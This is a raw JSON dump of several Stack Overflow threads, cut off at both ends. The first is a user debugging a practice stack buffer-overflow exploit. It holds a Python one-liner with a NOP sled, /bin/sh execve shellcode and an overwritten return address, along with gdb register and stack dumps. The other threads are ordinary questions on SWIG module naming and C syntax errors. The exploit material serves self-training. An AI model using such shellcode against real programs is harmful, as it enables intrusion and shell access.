Done!\");\n        puts(\"[*] Disconnecting...\");\n        return 0;\n    } else {\n        puts(\"[-] Incorrect password.\");\n        puts(\"[*] Disconnecting...\");\n        return 1;\n    }\n    return 0;\n}\n</code></pre>\n\n<p>for training purposes and I'm trying to exploit the buffer overflow vulnerability in it.\nI did <code>echo 0 &gt; /proc/sys/kernel/randomize_via_space</code>, and compiled with gcc using the <code>-fno-stack-protector</code> and <code>-z execstack</code> flags.</p>\n\n<p>I launched gdb, and after some research tried running the program with this input</p>\n\n<p>On an other terminal:</p>\n\n<pre><code>echo -n `python -c 'print(\"\\x90\"*45 + \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" + \"\\x42\\x42\\x42\\x42\\x42\\x42\")'` &gt; input\n</code></pre>\n\n<p>(So the nopslide + the shellcode + the return address, which is just 6 times \\x42 for now for testing purpose. I found the shellcode on <a href=\"http://shell-storm.org/shellcode/files/shellcode-806.php\" rel=\"nofollow noreferrer\">http://shell-storm.org/shellcode/files/shellcode-806.php</a>, I used this one because I'm on a 64 bits system)</p>\n\n<p>On gdb: <code>r &lt; input</code></p>\n\n<p>And it gave me this result:</p>\n\n<pre><code>Starting program: /root/remotetempclean &lt; input\n\nWELCOME TO THE REMOTE TEMP CLEANER SERVICE\n\nPlease enter a password: \n\n[-] Incorrect password.\n[*] Disconnecting...\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000424242424242 in ?? ()\n(gdb)  \n(gdb) \n(gdb) \n(gdb) \n(gdb) info register\nrax            0x1  1\nrbx            0x0  0\nrcx            0x7ffff7b06134   140737348919604\nrdx            0x7ffff7dd48c0   140737351862464\nrsi            0x7ffff7dd37e3   140737351858147\nrdi            0x0  0\nrbp            0x50f3bb05e545752    0x50f3bb05e545752\nrsp            0x7fffffffe1d0   0x7fffffffe1d0\nr8             0x7ffff7fd14c0   140737353946304\nr9             0x0  0\nr10            0x88b    2187\nr11            0x246    582\nr12            0x5555555546e0   93824992233184\nr13            0x7fffffffe2a0   140737488347808\nr14            0x0  0\nr15            0x0  0\nrip            0x424242424242   0x424242424242\neflags         0x10202  [ IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\n---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---\ngs             0x0  0\n(gdb)  \n</code></pre>\n\n<p>So the RIP register has successfully been overwritten with 0x42 bytes. So after that I inspected the stack, searching for a new return address in my nopslide:</p>\n\n<pre><code>(gdb) x/50x $rsp-65\n0x7fffffffe18f: 0x90909090  0x90909090  0x90909090  0x90909090\n0x7fffffffe19f: 0x90909090  0x90909090  0x90909090  0xc0319090\n0x7fffffffe1af: 0x9dd1bb48  0x8cd09196  0xf748ff97  0x5f5453db\n0x7fffffffe1bf: 0x54575299  0x0f3bb05e  0x42424205  0x00424242\n0x7fffffffe1cf: 0x00000000  0x00000000  0xffe2a800  0x007fffff\n0x7fffffffe1df: 0x04000000  0x00000100  0x5547ea00  0x00555555\n0x7fffffffe1ef: 0x00000000  0x00000000  0xdc57b600  0x7da82efc\n0x7fffffffe1ff: 0x5546e040  0x00555555  0xffe2a000  0x007fffff\n0x7fffffffe20f: 0x00000000  0x00000000  0x00000000  0x00000000\n0x7fffffffe21f: 0xfc57b600  0x28fd7bae  0x2257b615  0x28edc399\n0x7fffffffe22f: 0x00000015  0x00000000  0x00000000  0x00000000\n0x7fffffffe23f: 0x00000000  0x00000000  0xffe2b800  0x007fffff\n0x7fffffffe24f: 0xffe17000  0x007ffff7\n</code></pre>\n\n<p>So this <code>0x7fffffffe18f</code> address looked good, it was in the middle of the nopslide. So I modified the input to:</p>\n\n<pre><code>echo -n `python -c 'print(\"\\x90\"*45 + \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" + \"\\x8f\\xe1\\xff\\xff\\xff\\x7f\")'` &gt; input\n</code></pre>\n\n<p>So now I think I should've got a shell, but when I run the program...</p>\n\n<pre><code>(gdb) r &lt; input\nStarting program: /root/remotetempclean &lt; input\n\nWELCOME TO THE REMOTE TEMP CLEANER SERVICE\n\nPlease enter a password: \n\n[-] Incorrect password.\n[*] Disconnecting...\n\nProgram received signal SIGBUS, Bus error.\n0x00007fffffffe1c0 in ?? ()\n(gdb) info registers\nrax            0x0  0\nrbx            0x68732f6e69622f 29400045130965551\nrcx            0x7ffff7b06134   140737348919604\nrdx            0x0  0\nrsi            0x7ffff7dd37e3   140737351858147\nrdi            0x7fffffffe1c8   140737488347592\nrbp            0x50f3bb05e545752    0x50f3bb05e545752\nrsp            0x7fffffffe1c8   0x7fffffffe1c8\nr8             0x7ffff7fd14c0   140737353946304\nr9             0x0  0\nr10            0x88b    2187\nr11            0x246    582\nr12            0x5555555546e0   93824992233184\nr13            0x7fffffffe2a0   140737488347808\nr14            0x0  0\nr15            0x0  0\nrip            0x7fffffffe1c0   0x7fffffffe1c0\neflags         0x10213  [ CF AF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\n---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---\ngs             0x0  0\n(gdb) \n</code></pre>\n\n<p>The RIP has \"magically\" turned to <code>0x7fffffffe1c0</code> ? And it gives a SIGBUS, and I can't understand why... What am I doing wrong?</p>\n"}, {"tags": ["python", "c", "debian", "swig"], "comments": [{"owner": {"reputation": 28355, "user_id": 4788546, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2jWn.jpg?s=128&g=1", "display_name": "CristiFati", "link": "https://stackoverflow.com/users/4788546/cristifati"}, "edited": false, "score": 1, "creation_date": 1524666273, "post_id": 50024581, "comment_id": 87065510, "body": "<code>gcc -shared example.o example_wrap.o -o _example.so</code>."}, {"owner": {"reputation": 284, "user_id": 7307125, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-q9D9tnWIfRc/AAAAAAAAAAI/AAAAAAAAABk/x6rJYghj9rM/photo.jpg?sz=128", "display_name": "smajli", "link": "https://stackoverflow.com/users/7307125/smajli"}, "reply_to_user": {"reputation": 28355, "user_id": 4788546, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2jWn.jpg?s=128&g=1", "display_name": "CristiFati", "link": "https://stackoverflow.com/users/4788546/cristifati"}, "edited": false, "score": 0, "creation_date": 1524667005, "post_id": 50024581, "comment_id": 87066074, "body": "@CrisFati your solution works partially: when I do &#39;import example&#39; in python interpreter it doesn&#39;t give traceback, but doing later for example fract(4) it says: &#39;NameError: name &#39;fact&#39; is not defined.&#39; Anyway, when I do start python this way: &#39;python -i example.py&#39; I don&#39;t have to import anything and fact(4) gives proper answer of 24. What is the problem now?"}, {"owner": {"reputation": 28355, "user_id": 4788546, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2jWn.jpg?s=128&g=1", "display_name": "CristiFati", "link": "https://stackoverflow.com/users/4788546/cristifati"}, "edited": false, "score": 1, "creation_date": 1524667097, "post_id": 50024581, "comment_id": 87066132, "body": "<code>example.fact(4)</code> (<i>DOT</i> <b>not</b> <i>SPACE</i>). And the name is <code>fact</code> (your comment also mentions <code>fract</code>)."}, {"owner": {"reputation": 284, "user_id": 7307125, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-q9D9tnWIfRc/AAAAAAAAAAI/AAAAAAAAABk/x6rJYghj9rM/photo.jpg?sz=128", "display_name": "smajli", "link": "https://stackoverflow.com/users/7307125/smajli"}, "reply_to_user": {"reputation": 28355, "user_id": 4788546, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2jWn.jpg?s=128&g=1", "display_name": "CristiFati", "link": "https://stackoverflow.com/users/4788546/cristifati"}, "edited": false, "score": 0, "creation_date": 1524667225, "post_id": 50024581, "comment_id": 87066212, "body": "Great! You can make it an answer. With second comment as well. It is an important bit to this subject."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 9697552, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "expreun9", "link": "https://stackoverflow.com/users/9697552/expreun9"}, "is_accepted": false, "score": 0, "last_activity_date": 1524666798, "creation_date": 1524666798, "answer_id": 50024957, "question_id": 50024581, "link": "https://stackoverflow.com/questions/50024581/c-program-swig-to-python-gives-importerror-dynamic-module-does-not-define-init/50024957#50024957", "title": "c program SWIG to python gives &#39;ImportError: dynamic module does not define init function&#39;", "body": "<p>Like CristiFati said <em>\"gcc -shared example.o example_wrap.o -o _example.so\"</em></p>\n\n<p>The naming is wrong and causing the error. </p>\n"}, {"tags": [], "owner": {"reputation": 28355, "user_id": 4788546, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2jWn.jpg?s=128&g=1", "display_name": "CristiFati", "link": "https://stackoverflow.com/users/4788546/cristifati"}, "is_accepted": true, "score": 6, "last_activity_date": 1566558186, "last_edit_date": 1566558186, "creation_date": 1524668367, "answer_id": 50025500, "question_id": 50024581, "link": "https://stackoverflow.com/questions/50024581/c-program-swig-to-python-gives-importerror-dynamic-module-does-not-define-init/50025500#50025500", "title": "c program SWIG to python gives &#39;ImportError: dynamic module does not define init function&#39;", "body": "<p>This is what happens for a dynamic <em>Python</em> module (at least, in current <em>swig</em> version):</p>\n\n<ul>\n<li>The module name (let's stick with <em>example</em>, like in the tutorial) is specified in the <em>.i</em> file: <code>%module example</code></li>\n<li>At build time, 2 files are generated:\n\n<ul>\n<li><strong><em>_</strong>${MODULE_NAME}.so</em>: a dynamic module or shared object having the name the module name preceded by an <em>underscore</em>, in our example <em>_example.so</em>, which contain the actual <em>C</em> compiled code</li>\n<li><em>${MODULE_NAME}.py</em>: which is a wrapper over the previous one; <em>example.py</em> - this is the module \"entry point\"</li>\n</ul></li>\n</ul>\n\n<p>A <em>Python</em> dynamic module must implement an <strong><em>init*</em></strong> function as explained on <a href=\"https://docs.python.org/2/extending/extending.html#the-module-s-method-table-and-initialization-function\" rel=\"nofollow noreferrer\">[Python 2.Docs]: The Module\u2019s Method Table and Initialization Function</a>, and more: what comes after the <em>init</em> part, <strong>must match module (<em>.so</em>) name</strong> (in our case it's <strong><em>init_example</em></strong>).</p>\n\n<p>By naming the dynamic module <em>example.so</em>, when <em>Python</em> tried to load it, it searched for <em>initexample</em> which (obviously) didn't exist, raising <em>ImportError</em>.</p>\n\n<p>Changing the module name to <strong><em>_example.so</em></strong> (<code>gcc -shared example.o example_wrap.o -o _example.so</code>), as the <em>URL</em> also instructs, no longer raises an exception.</p>\n\n<p>Then, the functions are available like this:</p>\n\n\n\n<blockquote>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; import example  # This imports example.py which automatically imports _example.so\n&gt;&gt;&gt; example.fact(4), example.my_mod(7, 2), example.get_time()\n</code></pre>\n</blockquote>\n"}], "owner": {"reputation": 284, "user_id": 7307125, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-q9D9tnWIfRc/AAAAAAAAAAI/AAAAAAAAABk/x6rJYghj9rM/photo.jpg?sz=128", "display_name": "smajli", "link": "https://stackoverflow.com/users/7307125/smajli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2883, "favorite_count": 2, "accepted_answer_id": 50025500, "answer_count": 2, "score": 4, "last_activity_date": 1591515922, "creation_date": 1524665718, "question_id": 50024581, "link": "https://stackoverflow.com/questions/50024581/c-program-swig-to-python-gives-importerror-dynamic-module-does-not-define-init", "title": "c program SWIG to python gives &#39;ImportError: dynamic module does not define init function&#39;", "body": "<p>I am trying to use .c program in python script with SWIG. To start with, I installed SWIG and trying simple example from tutorial <a href=\"http://www.swig.org/tutorial.html\" rel=\"nofollow noreferrer\">swig webpage</a>.  </p>\n\n<p>I am using Raspberry Pi with Raspbian GNU/Linux 9.4 (stretch)  </p>\n\n<p>This is what I do:<br>\n1. <code>swig -python example.i</code> - great, this created two new files: 'example.py' and 'example_wrap.c'<br>\n2. <code>gcc -fpic -I/usr/include/python2.7 -c example_wrap.c</code> - this creates 'example_wrap.o' file<br>\n3. compile example.c in Geany; this gives 'example.o' file<br>\n4. <code>gcc -shared example.o example_wrap.o -o example.so</code> - now a new file 'example.so' is created.<br>\nTime to try it:  </p>\n\n<pre><code>python\n</code></pre>\n\n<p>I am using Python 2.7.13 here</p>\n\n<pre><code>&gt;&gt;&gt;import example\n</code></pre>\n\n<p>And this gives traceback:</p>\n\n<pre><code>File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nImportError: dynamic module does not define init function (initexample)\n</code></pre>\n\n<p>How to sort this problem out?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1524665737, "post_id": 50024518, "comment_id": 87065139, "body": "your <code>int</code> should be <code>(int)</code>. The first is a type name (which you cannot have in an executable statement), the second is a type cast. And you don&#39;t need the casts because the functions already return <code>int</code>. However, you do need <code>()</code> after the function names to make the function calls."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 2, "creation_date": 1524665739, "post_id": 50024518, "comment_id": 87065142, "body": "What are you trying to do with <code>if (int cumweightstatement + int cumweightcoping&gt;=20)</code>?  That statement is nowhere near correct C code.  If you&#39;re trying to call them as functions, just how do you call <code>printf()</code>?"}, {"owner": {"reputation": 8027, "user_id": 3282436, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e17caa3e07899b69539433130de1d420?s=128&d=identicon&r=PG&f=1", "display_name": "0x5453", "link": "https://stackoverflow.com/users/3282436/0x5453"}, "edited": false, "score": 0, "creation_date": 1524665743, "post_id": 50024518, "comment_id": 87065147, "body": "<code>else if (cumweightstatement + cumweightcoping&gt;=15 &amp;&amp; int cumweightstatement + int cumweightcoping&lt;20)</code>.  This doesn&#39;t make any sense; <code>cumweightstatement</code> and <code>cumweightcoping</code> are functions (did you mean to call each function like <code>cumweightstatement()</code>?) and you can&#39;t declare a new <code>int</code> inside the condition (did you mean to cast another variable like <code>(int)x</code>?)."}, {"owner": {"reputation": 1140, "user_id": 4892907, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh6.googleusercontent.com/-aE5LujU7Dz0/AAAAAAAAAAI/AAAAAAAAAfA/umYfIt-WSuI/photo.jpg?sz=128", "display_name": "xxxvodnikxxx", "link": "https://stackoverflow.com/users/4892907/xxxvodnikxxx"}, "edited": false, "score": 0, "creation_date": 1524731058, "post_id": 50024518, "comment_id": 87092519, "body": "You should edit your code to provide <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> - make some cleaning, but what I noticed <code>void printweightscoping(void); {</code> if that should be function then it should be like <code>void printweightscoping(){...}</code>"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1524731065, "post_id": 50024518, "comment_id": 87092524, "body": "<code>void main()</code> is incorrect, See: <a href=\"http://port70.net/~nsz/c/c11/n1570.html#5.1.2.2.1p1\" rel=\"nofollow noreferrer\">C11 Standard &#167;5.1.2.2.1 Program startup p1 (draft n1570)</a>. See also: <a href=\"http://stackoverflow.com/questions/204476/\">See What should main() return in C and C++?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524703769, "post_id": 50024670, "comment_id": 87082640, "body": "I tried that but it said &quot;&#39;cumweightstatement&#39; undeclared (first use in this function)&quot;"}, {"owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524777056, "post_id": 50024670, "comment_id": 87120176, "body": "My function printweightscoping isn&#39;t working though printweightsstatements is:"}, {"owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524777154, "post_id": 50024670, "comment_id": 87120219, "body": "void printweightsstatements()     {      printf(&quot;1:Strongly disagree\\n&quot;);      printf(&quot;2:Disagree\\n&quot;);      printf(&quot;3:Neither agree nor disagree\\n&quot;);      printf(&quot;4:Agree\\n&quot;);       printf(&quot;5:Strongly agree\\n&quot;);      }"}, {"owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524777210, "post_id": 50024670, "comment_id": 87120244, "body": "and void printweightscoping()      {      printf(&quot;1:Never\\n&quot;);      printf(&quot;2:Rarely(less than weekly) \\n&quot;);      printf(&quot;3:Sometimes(once a week)\\n&quot;);      printf(&quot;4:Often (several times a week)\\n&quot;);      printf(&quot;5:Always (about daily)\\n&quot;);     }"}, {"owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524779336, "post_id": 50024670, "comment_id": 87121117, "body": "I&#39;ve changed how I declare cumweightstatement and cumweightcoping but it doesn&#39;t make a difference"}, {"owner": {"reputation": 48, "user_id": 9624270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd376a44ee28bc9911d79bd0f53e670?s=128&d=identicon&r=PG&f=1", "display_name": "CimCim", "link": "https://stackoverflow.com/users/9624270/cimcim"}, "reply_to_user": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "edited": false, "score": 0, "creation_date": 1524816311, "post_id": 50024670, "comment_id": 87132381, "body": "@SK_ <code>void coping (void);</code> and <code>void printweightscoping(void);</code> does not work because you have a <b>&quot;;&quot;</b> at the end of the function declaration."}], "tags": [], "owner": {"reputation": 48, "user_id": 9624270, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cd376a44ee28bc9911d79bd0f53e670?s=128&d=identicon&r=PG&f=1", "display_name": "CimCim", "link": "https://stackoverflow.com/users/9624270/cimcim"}, "is_accepted": false, "score": -1, "last_activity_date": 1524730716, "last_edit_date": 1524730716, "creation_date": 1524665989, "answer_id": 50024670, "question_id": 50024518, "link": "https://stackoverflow.com/questions/50024518/error-invalid-operands-to-binary-have-int-and-int/50024670#50024670", "title": "error: invalid operands to binary + (have &#39;int (*)()&#39; and &#39;int (*)()&#39;)", "body": "<p>a ';' is missing at the end of the line</p>\n\n<pre><code>    printf (\"You are mildly stressed and at a low risk for depression, but you could still benefit from using positive coping strategies\\n\")\n</code></pre>\n\n<p>and as said in the comments, you have some strange declaration in some lines</p>\n\n<pre><code>    else if (cumweightstatement + cumweightcoping&gt;=15 &amp;&amp; int cumweightstatement + int cumweightcoping&lt;20)\n</code></pre>\n\n<p>if you want to cast your variables as int, use </p>\n\n<pre><code>    (int)your_variable\n</code></pre>\n\n<p>But you declare cumweightstatement and cumweightcoping as function, not simple variable...</p>\n\n<pre><code>    int cumweightstatement();\n    int cumweightcoping();\n</code></pre>\n\n<p>The name of a function is its address in memory, that explain why your compiler complain about adding some pointer (invalid operands to binary + (have 'int (*)()' and 'int (*)()')</p>\n\n<p><strong>EDIT:</strong>\nYou have many mistakes in your code, confusion between variables you declare as functions: <code>int cumweightstatement();</code> should be <code>int cumweightstatement;</code>\nand some functions calls that are not correctly done, like <code>printweightsstatements;</code> which should be <code>printweightsstatements();</code></p>\n\n<p>Declaring variables outside a function make it globale: you can reach it from any function in the file.\nDeclaring a variable in a function makes it locale: you can NOT reach it out of its scope.\ni.e.: when you declare, for example in <code>void statements(void)</code>:</p>\n\n<pre><code>    int cumweightstatement=weight1+weight2+weight3+weight4;\n</code></pre>\n\n<p>you declare a locale variable <code>cumweightstatement</code> and you affect to it the sum of each weight.\nBut you will lose it as soon as you get out of the function.</p>\n\n<p>The easiest, starting from the code you have, would be to use globale variables, what you probably try to do with the declaration</p>\n\n<pre><code>    int cumweightstatement();\n</code></pre>\n\n<p>but, once again, this creates a function, not a globale variable.</p>\n\n<p>This link <a href=\"https://www.codingunit.com/c-tutorial-functions-and-global-local-variables\" rel=\"nofollow noreferrer\">https://www.codingunit.com/c-tutorial-functions-and-global-local-variables</a> will give you some bases to declare functions and locale/globale variables</p>\n"}], "owner": {"reputation": 1, "user_id": 9697752, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "SK _", "link": "https://stackoverflow.com/users/9697752/sk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1503, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1524730716, "creation_date": 1524665554, "last_edit_date": 1524666262, "question_id": 50024518, "link": "https://stackoverflow.com/questions/50024518/error-invalid-operands-to-binary-have-int-and-int", "title": "error: invalid operands to binary + (have &#39;int (*)()&#39; and &#39;int (*)()&#39;)", "body": "<p>I was creating the following code which is deducing a student's stress level from their usage of negative coping strategies and agreement with low self-image associated statements. Below is my code, and bolded are the parts I had problems with :</p>\n\n<pre><code>void statements (void);\n    void printweightsstatements(void);\nvoid coping (void);\nvoid printweightscoping(void);\nvoid advice ();\nint cumweightstatement();\nint cumweightcoping();\n\nvoid main()\n{\n statements ();\n coping ();\n**if (int cumweightstatement + int cumweightcoping&gt;=20)** \n\n printf (\"You are very stressed and at a high risk for depression. Please \nsee a doctor or psychiaqtrist as soon as possible\\n\");\n else if (cumweightstatement + cumweightcoping&gt;=15 &amp;&amp; int cumweightstatement + int cumweightcoping&lt;20)\nprintf (\"You are quite stressed and at a moderate risk for depression. Please see your school guidance counselor\\n\");\nelse if (cumweightstatement + cumweightcoping&lt;=14)\nprintf (\"You are mildly stressed and at a low risk for depression, but you could still benefit from using positive coping strategies\\n\")\n}\n\nvoid printweightsstatements()\n{\n printf(\"1:Strongly disagree\\n\");\n printf(\"2:Disagree\\n\");\n printf(\"3:Neither agree nor disagree\\n\");\n printf(\"4:Agree\\n\");\nprintf(\"5:Strongly agree\\n\");\n\n}\n\n\nvoid statements(void)\n\n{\n int weight1;\n int weight2;\n int weight3;\n int weight4;\n\n printf (\"How much do you agree with the following statements?\\n\");\n\n printf (\"Statement 1: I have trouble concentrating on my homework for 1 hour straight\\n\");\n printweightsstatements;\n printf(\"1:Strongly disagree\\n\");\n printf(\"2:Disagree\\n\");\n printf(\"3:Neither agree nor disagree\\n\");\n printf(\"4:Agree\\n\");\n printf(\"5:Strongly agree\\n\");\n\nprintf (\"Statement 2: I do not have much control over events in my life\\n\");\nprintweightsstatements;\nprintf(\"1:Strongly disagree\\n\");\nprintf(\"2:Disagree\\n\");\nprintf(\"3:Neither agree nor disagree\\n\");\nprintf(\"4:Agree\\n\");\nprintf(\"5:Strongly agree\\n\");\nscanf(\"%d\", &amp;weight2);\nprintf (\"Statement 3: During this school year, I have been stressed a lot\\n\");\nprintweightsstatements;\nprintf(\"1:Strongly disagree\\n\");\nprintf(\"2:Disagree\\n\");\nprintf(\"3:Neither agree nor disagree\\n\");\nprintf(\"4:Agree\\n\");\nprintf(\"5:Strongly agree\\n\");\nscanf(\"%d\", &amp;weight3);\nprintf (\"Statement 4: Although I try very hard, there is always some schoolwork too difficult for me\\n\");\nprintf(\"1:Strongly disagree\\n\");\nprintf(\"2:Disagree\\n\");\nprintf(\"3:Neither agree nor disagree\\n\");\nprintf(\"4:Agree\\n\");\nprintf(\"5:Strongly agree\\n\");\nscanf(\"%d\", &amp;weight4);\nprintweightsstatements;\n\nint cumweightstatement=weight1+weight2+weight3+weight4;\n}\n\n\nvoid coping (void);\n{\n  int weight1;\n  int weight2;\n  int weight3;\n  int weight4;\n  int weight5;\n\nprintf (\"How often do you use each of the following coping strategies?\\n\");\nprintf (\"Strategy 1: Negative self-talk (for example, I can\u2019t do this,this is too hard for me, I\u2019ll never get good at this)\\n\");\nprintweightscoping;\nscanf(\"%d\", &amp;weight1);\nprintf (\"Strategy 2: Overusing Internet/social media/phone for non-school-related activities (over 1 hour/day)\\n\");\nprintweightscoping;\nscanf(\"%d\", &amp;weight2);\nprintf (\"Strategy 3: Extended sleep or naps (above 8-9 hours of regular sleep)\\n\");\nprintweightscoping;\nscanf(\"%d\", &amp;weight3);\nprintf (\"Strategy 4:Procrastination or avoiding the task (leaving your schoolwork to the last minute, or not doing it at all)\\n\");\nprintweightscoping;\nscanf(\"%d\", &amp;weight4);\nprintf (\"Strategy 5:Denial (ignoring your problems and keep doing things the same way)\\n\");\nprintweightscoping;\nscanf(\"%d\", &amp;weight5);\nint cumweightcoping=weight1+weight2+weight3+weight4;\n}\n\nvoid printweightscoping(void);\n{\n printf(\"1:Never\\n\");\n printf(\"2:Rarely(less than weekly) \\n\");\n printf(\"3:Sometimes(once a week)\\n\");\n printf(\"4:Often (several times a week)\\n\");\n printf(\"5:Always (about daily\")\n}\n</code></pre>\n\n<p>This is the log. Do you have any idea how to fix these errors?</p>\n\n<pre><code>main.c: In function 'main':\nmain.c:23:9: error: expected expression before 'int'\n\nmain.c:25:33: error: invalid operands to binary + (have 'int (*)()' and 'int (*)\nmain.c:25:58: error: expected expression before 'int'\n                                                      ^\nmain.c:27:33: error: invalid operands to binary + (have 'int (*)()' and 'int (*)\n expected identifier or '(' before '{' token\n</code></pre>\n"}, {"tags": ["c++", "c", "function", "struct"], "comments": [{"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1524665573, "post_id": 50024452, "comment_id": 87065053, "body": "Why are you using <code>extern &quot;C&quot; {</code> ? The <code>get_buses()</code> function is C++. <a href=\"//stackoverflow.com/q/1041866\">What is the effect of extern &quot;C&quot; in C++?</a>"}, {"owner": {"reputation": 12858, "user_id": 6752050, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d5c4caa7ff50e6e492c3957ca20ef6c?s=128&d=identicon&r=PG&f=1", "display_name": "S.M.", "link": "https://stackoverflow.com/users/6752050/s-m"}, "edited": false, "score": 0, "creation_date": 1524665646, "post_id": 50024452, "comment_id": 87065092, "body": "<code>extern &quot;C&quot; void get_buses(BusesStruct * bus_scelti){</code> should be in definition too."}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1524665877, "post_id": 50024452, "comment_id": 87065237, "body": "Are you linking in the cpp?"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "reply_to_user": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1524666096, "post_id": 50024452, "comment_id": 87065394, "body": "@JohnnyMopp the <code>extern &quot;C&quot;</code> is so the function can be called from C code, which OP is trying to do. It doesn&#39;t matter that the function definition is in C++."}, {"owner": {"reputation": 1, "user_id": 5951521, "user_type": "registered", "profile_image": 